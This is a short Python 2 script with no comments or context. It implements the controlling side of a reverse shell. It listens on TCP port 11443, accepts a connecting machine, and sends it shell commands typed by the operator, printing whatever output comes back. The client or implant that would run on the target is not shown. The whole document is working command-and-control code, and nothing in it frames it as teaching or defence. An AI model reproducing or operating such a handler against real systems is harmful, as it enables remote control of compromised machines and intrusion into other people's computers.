from socket import *

HOST = ''
PORT = 11443

s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(10)

conn, addr = s.accept()
print 'Connected by', addr
data = conn.recv(1024)

while True:
    command = raw_input("enter shell command or quit: ")
    conn.send(command)
    if command == "quit": break

    data = conn.recv(1024)
    print data

conn.close()
